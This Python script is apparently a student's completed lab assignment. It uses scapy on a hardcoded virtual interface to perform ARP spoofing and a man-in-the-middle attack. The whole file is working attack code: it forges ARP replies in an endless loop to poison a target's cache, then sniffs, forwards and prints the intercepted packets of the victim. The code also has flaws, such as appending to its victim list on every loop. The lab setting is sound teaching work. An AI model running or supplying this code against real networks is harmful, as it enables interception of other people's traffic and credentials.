#!/usr/bin/python

# Install scapy package
#pip install scapy
import scapy.all as scapy

#OR install pcap library
#pip install pypcap
import pcap

import netifaces
import threading
import time

#my own imports
# i use this to get my own mac adress rather than arp cache 
import subprocess

hackedMachines = []
# Hardcoded interface
interface = "virbr0"

"""
Get the MAC address of a device on the local network given its IP address.
Args:
    ip (str): The IP address of the target device.
Returns:
    str: The MAC address of the target device.
"""

def getMacAddress(ip)->str:
    # Your code here
    mac = scapy.getmacbyip(ip)
    return str(mac)

"""
Get the IP address of the current machine from the available network interfaces.
Returns:
    str: The selected IP address of the current machine.
"""

def getOwnIpAddress() -> str:
    # Your code here
    # Get the IP address of the selected interface
    host_ip = scapy.get_if_addr(interface)
    return host_ip
    #pass

"""
Sends an ARP spoofing packet to the target IP address, making it believe that the spoof IP address is associated with the attacker's MAC address.
Args:
    targetIp (str): The IP address of the target machine to be spoofed.
    spoofIp (str): The IP address that the target machine should believe is associated with the attacker's MAC address.
Returns:
    None
Raises:
    Exception: If there is an error in sending the ARP packet.
Example:
    spoof("192.168.1.5", "192.168.1.1")
"""
def spoof(targetIp, spoofIp):

    target_mac = getMacAddress(targetIp)
    # Your code here
    
    #my_mac = getMacAddress(getOwnIpAddress())
    #my_mac = "52:54:00:37:61:41"
    #getting my own mac address
    result = subprocess.run(['ifconfig', interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    if result.returncode == 0:
        for line in result.stdout.splitlines():
            if 'ether' in line:
                my_mac = line.split()[1]

    # op 2 is the arp option for for arp reply
    arp_reply = scapy.ARP(op=2, hwsrc=my_mac, psrc=spoofIp, hwdst=target_mac, pdst=targetIp)

    #for debugging
    #print(f"my ip address is {getOwnIpAddress()}")
    #print(f"my mac is {my_mac}")

    # Just an idea. Try using scapy to send ARP packets to the target IP address
    # Send the packet in an infinite loop
    try:
        print(f"Sending spoofed ARP replies to {targetIp}...")
        while True:
            # we also need to make an ethernet layer for transport
            
            #eth = scapy.Ether(dst=target_mac)  # Ethernet frame with target's MAC as destination
            #packet = eth / arp_reply
            #scapy.send(packet, verbose=0)

            scapy.sendp(arp_reply, iface=interface,verbose=0)
            # now that we have sent a bad arp packet and curroupted the arp cache of target
            # we need to check we haven't already spoofed them already
            # for loop to check hacked machines
            hackedMachines.append([targetIp, target_mac])
            #print(f"the packet has been made")
            #pass
    except KeyboardInterrupt:
        print("\nStopping ARP spoofing.")
        return
    hackedMachines.append([targetIp, target_mac])
    
    #pass

"""
Starts the packet sniffer to capture network packets.
This function initiates the sniffing process
It captures packets and processes them to forward packets to the intended destination if it's one of the hacked machines.
Returns: None
"""

def startSniffer():
    # Start sniffing packets
    # Your code here
    

    # to make sure that we are the man in the middle the original ip still needs to get the correct packet
    # that means we need to look at all the traffic in the interface and look into the destination ip
    #if that ip is one we hacked we need to forward the packet to the correct ip so it still recieves the right packet
    while True:
        try:
            # we will keep on sniffing until there is a key board interupt
            #before we can sniff the packet we need to code up a function to work with the packet correctly
            def packet_routing(packet):
                #print("we got a packet")
                # we check to see if the packets dst ip is one of our hacked ones if so we forward it from us to the original
                if packet.haslayer("IP"):
                    ip_layer = packet["IP"]

                    #print(f"got an IP packet with this ip {ip_layer.src}")
                    #print(f"here is the hacked list and what is in it {hackedMachines}")

                    #print(f"Source IP: {ip_layer.src}")
                    #print(f"Destination IP: {ip_layer.dst}")
                    # now we check the dst ip has been hacked
                    # we are making a list of keys from hackedMachines
                    for hackedip, hackedmac in hackedMachines:
                        if hackedip == ip_layer.src:
                            # this is a spoofed ip need to forward it to the orignal
                            # otherwise the spy jig is up and the target knows
                            scapy.sendp(packet, iface=interface, verbose=0)
                            #print(f"hit this part")

                            # now we are going to print out the intercepted packet casue why not

                            #print(f" the packet payload is {packet.payload}")
                            
                            #print("we reach this point")
                            #now if it is http we read the packet
                            packet.show()

                            #pass
                        
            # we are going to sniff on packet on hard coded interface to
            scapy.sniff(iface=interface, prn=packet_routing)
            #doing nothing for now
        except KeyboardInterrupt:
            print("\nStopping Sniffer")
            break
    
    #pass

def main():
    target_ip = "192.168.124.139"  # Replace with the target IP address
    spoof_ip = "192.168.124.2"    # Replace with the IP address to spoof

    print(f"the targest ip {target_ip} mac address is {getMacAddress(target_ip)}")
    print(f"the spoof ip {spoof_ip} mac address is {getMacAddress(spoof_ip)}")

    # Function to continuously call the spoof function
    def continuousSpoof():
        while True:
            spoof(target_ip, spoof_ip)
            #print(f"hackedMachines = {hackedMachines}")
            time.sleep(2)  # Sleep for 2 seconds before sending the next spoof packet

    # Start the spoofing thread
    spoof_thread = threading.Thread(target=continuousSpoof)
    spoof_thread.start()

    # Start the packet sniffer thread
    # This thread will run in the background and sniff packets. I do it like this in case students use a blocking solution
    sniffer_thread = threading.Thread(target=startSniffer)
    sniffer_thread.start()

# Run the main function
main()